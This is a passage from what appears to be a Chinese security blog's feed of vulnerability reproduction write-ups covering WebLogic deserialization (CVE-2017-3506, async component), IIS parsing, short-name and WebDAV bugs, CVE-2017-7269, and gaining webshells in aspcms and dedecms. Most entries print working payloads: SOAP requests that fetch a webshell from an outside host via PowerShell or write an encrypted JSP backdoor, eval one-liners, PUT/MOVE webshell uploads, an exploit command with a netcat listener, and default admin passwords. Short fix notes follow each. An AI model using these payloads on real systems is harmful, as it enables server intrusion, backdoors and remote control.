class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;powershell(new-object</span><br><span class="line">System.Net.WebClient).DownloadFile(&#x27;http://192.168.0.182:81/shell.jsp.txt&#x27;,&#x27;serv</span><br><span class="line">ers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</span><br><span class="line">&#x27;)&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><a href="http://192.168.0.185:7001/_async/webshell.jsp">http://192.168.0.185:7001/_async/webshell.jsp</a> 连接后门</p><p><img src="https://pic.888888.al/i/2023/03/06/11730ol.png" alt="1"></p><h2 id="4-修复建议"><a href="#4-修复建议" class="headerlink" title="4.修复建议"></a>4.修复建议</h2><p>禁用bea_wls9_async_response组件</p><p>删除wls9_async_response的war包并重启</p><p>禁止访问 &#x2F;_async&#x2F;* 路径</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMLDecoder反序列化漏洞(CVE-2017-3506)</title>
      <link href="/archives/f622fe60.html"/>
      <url>/archives/f622fe60.html</url>
      
        <content type="html"><![CDATA[<h1 id="XMLDecoder反序列化漏洞-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞(CVE-2017-3506)"></a>XMLDecoder反序列化漏洞(CVE-2017-3506)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-2017-<br>10271，Oracle官方在2017年10月份发布了该漏洞的补丁，但没有公开漏洞细节，如果企业未及时安装<br>补丁，存在被攻击的风险。对企业服务器发起了大范围远程攻击，对大量企业的服务器造成了严重威<br>胁，受影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>环境weblogic的版本为10.3.6</p><p>访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/10zk3p9.png" alt="0"></p><p>发送post包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.0.185:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/hAccept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;</span><br><span class="line">Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1228</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.js</span><br><span class="line">p&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U</span><br><span class="line">extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return</span><br><span class="line">super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))</span><br><span class="line">&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher</span><br><span class="line">c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new</span><br><span class="line">U(this.getClass().getClassLoader()).g(c.doFinal(new</span><br><span class="line">sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta</span><br><span class="line">nce().equals(pageContext);&#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>访问网址 密码 rebeyond</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/bea_wls_internal/test.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/1119kxa.png" alt="1"></p><h2 id="3-修复方案"><a href="#3-修复方案" class="headerlink" title="3.修复方案"></a>3.修复方案</h2><p>更新到最新版本,打上10271的补丁,对访问wls-wsat的资源进行访问控制 ,或者根据业务所有需求，考虑<br>是否删除WLS-WebServices组件。包含此组件路径为：</p><p>Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wlswsat</p><p>Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;wlswsat.war</p><p>Middleware&#x2F;wlserver_10.3&#x2F;server&#x2F;lib&#x2F;wls-wsat.war</p><p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认<a href="http://weblogic_ip/wls-w">http://weblogic_ip/wls-w</a><br>sat&#x2F; 是否为404页面。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic弱口令getshell漏洞</title>
      <link href="/archives/c1b8f454.html"/>
      <url>/archives/c1b8f454.html</url>
      
        <content type="html"><![CDATA[<h1 id="weblogic-弱口令getshell漏洞"><a href="#weblogic-弱口令getshell漏洞" class="headerlink" title="weblogic 弱口令getshell漏洞"></a>weblogic 弱口令getshell漏洞</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>在weblogic搭建好之后没有修改进入后台的密码 导致弱口令登录获得webshell</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>访问 登录页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/console/login/LoginForm.jsp</span><br></pre></td></tr></table></figure><p>使用默认密码进行登录，如果登录不上使用字段进行穷举 weblogic常用弱口令： <a href="http://cirt.net/passw">http://cirt.net/passw</a><br>ords?criteria&#x3D;weblogic</p><p>错误密码5次之后就会自动锁定，这里使用weblogic&#x2F;Oracle@123登陆后台<br><img src="https://pic.888888.al/i/2023/03/06/10qliat.png" alt="0"></p><p>登录后台后 点击部署 点击安装 点击上传文件<br><img src="https://pic.888888.al/i/2023/03/06/10r6vm9.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf aaa.war .</span><br></pre></td></tr></table></figure><p>打包后门war文件 上传即可<br><img src="https://pic.888888.al/i/2023/03/06/10tj554.png" alt="2"></p><p>点击下一步<br><img src="https://pic.888888.al/i/2023/03/06/10tzect.png" alt="3"></p><p>点击下一步<br><img src="https://pic.888888.al/i/2023/03/06/10uiu4z.png" alt="4"></p><p>点击完成 来到这个页面<br><img src="https://pic.888888.al/i/2023/03/06/10up0tt.png" alt="5"></p><p>访问网站网址即可获取webshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/z/shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/10vz5wu.png" alt="6"></p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p><strong>1.设置强口令</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS7文件解析漏洞</title>
      <link href="/archives/5f0a23e4.html"/>
      <url>/archives/5f0a23e4.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg&#x2F;png后面加上&#x2F;.php，会将a001.jpg&#x2F;png<br>解析为php文件</p><h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><p>上传图片到网站允许目录 在图片上加上&#x2F;.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.148:8980/1.jpg/.php</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/hgwral.png" alt="0"></p><h2 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h2><p>1.配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p><p>2.编辑映射模块-&gt;映射-&gt;打勾<br><img src="https://pic.888888.al/i/2023/03/04/hhh2zf.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS RCE-CVE-2017-7269</title>
      <link href="/archives/812b5b48.html"/>
      <url>/archives/812b5b48.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的<br>ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 <strong>If:&lt;http:&#x2F;&#x2F;</strong> 开头的长标头执行任<br>意代码 PROPFIND请求</p><h2 id="2-影响范围"><a href="#2-影响范围" class="headerlink" title="2.影响范围"></a>2.影响范围</h2><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p><h2 id="3-复现"><a href="#3-复现" class="headerlink" title="3.复现"></a>3.复现</h2><p>POC地址:<a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">115</span> <span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">154</span> <span class="number">9999</span></span><br><span class="line">nc -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/hcum09.png" alt="0"></p><h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h2><p><strong>1.关闭 WebDav服务</strong></p><p><strong>2.升级</strong></p><p><strong>3.部署安全设备</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS短文件名漏洞</title>
      <link href="/archives/c8c55640.html"/>
      <url>/archives/c8c55640.html</url>
      
        <content type="html"><![CDATA[<h1 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>简介：Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位<br>Windows的程序访问这些文件。在cmd下输入”dir &#x2F;x”即可看到短文件名的效果。<br><img src="https://pic.888888.al/i/2023/03/04/guxund.png" alt="0"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p><p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六<br>种<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>提醒一下 IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;&#x3D;8.0版本,即使没有安装ASP.NET，通过<br>OPTIONS和TRACE方法也可以猜解成功。以下通过开启IIS6.0 ASP.NET后进行复现<br><img src="https://pic.888888.al/i/2023/03/04/gvynqo.png" alt="1"></p><p><strong>短文件名特征：</strong><br>1.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的<br>6个字符是相同的,后面的数字进行递增<br><img src="https://pic.888888.al/i/2023/03/04/gx32mj.png" alt="2"></p><p>2.后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断。<br><img src="https://pic.888888.al/i/2023/03/04/gxbx84.png" alt="3"></p><p>3.所有小写字母均转换成大写的字母</p><p>4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<br><img src="https://pic.888888.al/i/2023/03/04/gy0aai.png" alt="4"></p><p>5.长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包<br>含空格或者其他部分特殊字符,不论长度均会生成短文件。<br><img src="https://pic.888888.al/i/2023/03/04/gygmee.png" alt="5"><br>.</p><p>.</p><p>使用payload验证目标是否存在IIS短文件名漏洞,下图显示的404,说明目标存在该短文件名<br>注：* 可以匹配n个字符, n可以为0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><strong>通过浏览器访问一个存在的短文件名，会返回404状态码, 404说明该文件存在</strong><br><img src="https://pic.888888.al/i/2023/03/04/gz7ce8.png" alt="6"><br><strong>通过浏览器访问一个不存在的短文件名，会返回400状态码, 400说明该文件不存在</strong><br><img src="https://pic.888888.al/i/2023/03/04/h02alp.png" alt="7"></p><p>通过浏览器访问上面两个payload,根据返回的结果,可以说明目标存在IIS短文件漏洞</p><p>判断漏洞存在后,接下来手工详细分析猜解IIS短文件名</p><p>在网站目录下新建一个 abcde1231111.txt文件,分别访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/a*~1*/a.aspx</span><br><span class="line"></span><br><span class="line">http://upload.moonteam.com/b*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h1yjsz.png" alt="8"><br><img src="https://pic.888888.al/i/2023/03/04/h24niw.png" alt="9"><br>通过两次的提交确认了a是404 b是400 所以存在a文件开头的短文件。</p><p>通过上面的方法接着往后猜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1*/a.aspx</span><br></pre></td></tr></table></figure><p>到这文件名已经出来了，接着就是判断是目录还是文件。</p><p><img src="https://pic.888888.al/i/2023/03/04/h342vk.png" alt="10"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1/a.aspx</span><br><span class="line"></span><br><span class="line">````</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![11](https://pic.888888.al/i/2023/03/04/h4f1g5.png)</span><br><span class="line">判断是文件 按照a-z进行测试 404表示存在 400表示不存在 第一个字符不是a开头的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```asp</span><br><span class="line">http://upload.moonteam.com/abcde*~1.a*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h517hs.png" alt="12"><br>.</p><p>.</p><p>.</p><p>第一个是字符是t开头的，接着往后测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.t*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h5pc7z.png" alt="13"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.txt*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h6lzq6.png" alt="14"></p><p>按照上面的方法依次猜解得到该短文件名的后缀是txt 短文件名为 abcde~1.txt 可以接着猜解<br>abcde1231111.txt文件名</p><p>.</p><p><strong>使用IIS短文件名扫描软件，获取目标存在哪些短文件名</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis_shortname_Scan.py http://upload.moonteam.com/</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/h7dr8d.png" alt="15"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、升级.net framework</p><p>2、修改注册表键值：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem<br>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p><p>命令行关闭 fsutil behavior set disable8dot3 1</p><p>新建文件 aaaaaaaaaaaaaazzzzz.txt 已经没有短文件名了。<br><img src="https://pic.888888.al/i/2023/03/04/h8mdkg.png" alt="16"><br>**注:**此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消<br>失。如果不重新复制，已经存在的短文件名则是不会消失的。</p><p>将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到<br>c:\www。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS文件解析漏洞</title>
      <link href="/archives/e735aa4d.html"/>
      <url>/archives/e735aa4d.html</url>
      
        <content type="html"><![CDATA[<h1 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h1><h2 id="1-基于文件名"><a href="#1-基于文件名" class="headerlink" title="1 基于文件名"></a>1 基于文件名</h2><h3 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h3><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 <strong>;</strong> 号及其后面的内容，相当于截断。</p><p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p><p><strong>iis6.0-&gt;主目录-&gt;配置 查看 这几种扩展名都是指向同一个文件</strong></p><p><strong>C:\WINDOWS\system32\inetsrv\asp.dll 所以都解析成asp</strong><br><img src="https://pic.888888.al/i/2023/03/04/gp15me.png" alt="0"></p><h3 id="1-2复现"><a href="#1-2复现" class="headerlink" title="1.2复现"></a>1.2复现</h3><p>通过文件上传，或者创建文件，格式为*.asp;.jpg<br><img src="https://pic.888888.al/i/2023/03/04/gpxqs6.png" alt="1"></p><h3 id="1-3防御"><a href="#1-3防御" class="headerlink" title="1.3防御"></a>1.3防御</h3><p><strong>1.禁止创建和上传此类畸形文件</strong></p><p><strong>2.图片存放目录设置成禁止脚本文件执行</strong></p><p><strong>3.升级iis版本</strong></p><h2 id="2-基于文件夹"><a href="#2-基于文件夹" class="headerlink" title="2 基于文件夹"></a>2 基于文件夹</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>该版本默认将 *.asp&#x2F; 目录下的所有文件当成Asp解析。</p><h3 id="2-2复现"><a href="#2-2复现" class="headerlink" title="2.2复现"></a>2.2复现</h3><p>创建文件.asp文件夹 上传图片格式后门到此目录<br><img src="https://pic.888888.al/i/2023/03/04/gsbdx0.png" alt="2"></p><h3 id="2-3防御"><a href="#2-3防御" class="headerlink" title="2.3防御"></a>2.3防御</h3><p><strong>1.禁止创建此类文件夹</strong></p><p><strong>3.升级iis版本</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS任意文件写入漏洞</title>
      <link href="/archives/1f4414ad.html"/>
      <url>/archives/1f4414ad.html</url>
      
        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/03/04/fomu4q.png" alt="0"><br><img src="https://pic.888888.al/i/2023/03/04/fr28m6.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/03/04/fsprkx.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/gjfi01.png" alt="3"></p><p>shell.asp写入成功。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><strong>1.关闭webdav</strong><br><strong>2.关闭写入权限</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aspcms拿webshell</title>
      <link href="/archives/d8c67745.html"/>
      <url>/archives/d8c67745.html</url>
      
        <content type="html"><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>网站中的配置文件，如果可在后台里进行修改，如果没有任何过滤，可以在里面写入而已的语句，即可<br>获取webshell。</p><p><strong>注</strong>：注意闭合问题，因为配置文件在网站中是全局调用，如果写错，网站会错误。无法访问。<br>在aspcms可以修改 如果是字符类型填写双引号闭合 如果是数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br><span class="line"><span class="string">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>一样的，通过弱口令进入到后台。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/03/03/kglyj8.jpg" alt="0"></p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>点击<strong>拓展功能-&gt;幻灯片管理</strong>，打开<strong>burpsuit</strong>进行抓包。<br><img src="https://pic.888888.al/i/2023/03/03/khq2hk.jpg" alt="1"><br>在<strong>slidestyle</strong>的后面写入一句话木马，注意闭合问题，并进行URL-encode。<br><img src="https://pic.888888.al/i/2023/03/03/kjiypm.jpg" alt="2"><br>放包，用蚁剑尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/03/03/kk3gui.jpg" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms后台拿webshell</title>
      <link href="/archives/226c5523.html"/>
      <url>/archives/226c5523.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>我们用弱口令爆破，将账号和密码穷举出来。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/03/03/k0eljh.jpg" alt="0"></p><h2 id="方法一：文件上传"><a href="#方法一：文件上传" class="headerlink" title="方法一：文件上传"></a>方法一：文件上传</h2><p>我们进入到<strong>核心-&gt;文件上传</strong>这个位置，直接上传带有木马的文件。<br><img src="https://pic.888888.al/i/2023/03/03/k1640o.jpg" alt="1"><br><strong>上传成功!</strong><br><img src="https://pic.888888.al/i/2023/03/03/k1ovue.jpg" alt="2"></p><h2 id="方法二：修改模块文件"><a href="#方法二：修改模块文件" class="headerlink" title="方法二：修改模块文件"></a>方法二：修改模块文件</h2><p>进入<strong>模板-&gt;index.html</strong>，点击修改。<br><img src="https://pic.888888.al/i/2023/03/03/k2zamn.jpg" alt="3"><br>加入我们的payload。<br><img src="https://pic.888888.al/i/2023/03/03/k3jzmv.jpg" alt="4"><br>修改成功后，我们到生成这个界面，将主页位置中文件的后缀改为.php，然后更新主页。<br><img src="https://pic.888888.al/i/2023/03/03/k4tbbv.jpg" alt="5"><br>点击游览，上床成功！<br><img src="https://pic.888888.al/i/2023/03/03/k59nf3.jpg" alt="6"></p><h2 id="方法三：后台任意命令执行"><a href="#方法三：后台任意命令执行" class="headerlink" title="方法三：后台任意命令执行"></a>方法三：后台任意命令执行</h2><p>在dedecms后台广告管理，可以插入php任意代码。<br><img src="https://pic.888888.al/i/2023/03/03/k62oyl.jpg" alt="7"></p><p>点击增加一个广告位，在广告内容写入payload。<br><img src="https://pic.888888.al/i/2023/03/03/k729bl.jpg" alt="8"></p><p>用中国菜刀尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/03/03/k7mvvc.jpg" alt="9"><br><img src="https://pic.888888.al/i/2023/03/03/k7q9cr.jpg" alt="10"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress后台拿webshell</title>
      <link href="/archives/0.html"/>
      <url>/archives/0.html</url>
      
